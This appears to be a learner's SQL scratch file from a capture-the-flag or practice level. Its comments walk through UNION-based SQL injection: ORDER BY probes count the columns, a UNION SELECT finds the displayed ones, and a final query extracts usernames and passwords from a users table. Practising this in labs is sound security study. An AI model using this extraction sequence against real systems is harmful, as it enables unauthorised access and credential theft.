USE something_db;

USE level1_users;

--The SELECT 1 FROM level1_users is my guess of what is going on with the cat=1... Pulling this out me butt


-- Using ORDER BY to say, "hey! are there columns that exist?"
SELECT 1 FROM level1_users
ORDER BY 1;

SELECT 1 FROM level1_users
ORDER BY 2;

SELECT 1 FROM level1_users
ORDER BY 3;

SELECT 1 FROM level1_users
ORDER BY 4;

SELECT 1 FROM level1_users
ORDER BY 5; --at this point, the column does not exist, so we know there are 4 columns

SELECT 1 FROM level1_users
UNION
SELECT 1,2,3,4 FROM level1_users;
--the output of this was 3 and 4 so we know there is readable information in these columns

SELECT 1 FROM level1_users
UNION
--this is a guess that column 3 and 4 are username and password respectively
SELECT 1,2,username,password FROM level1_users;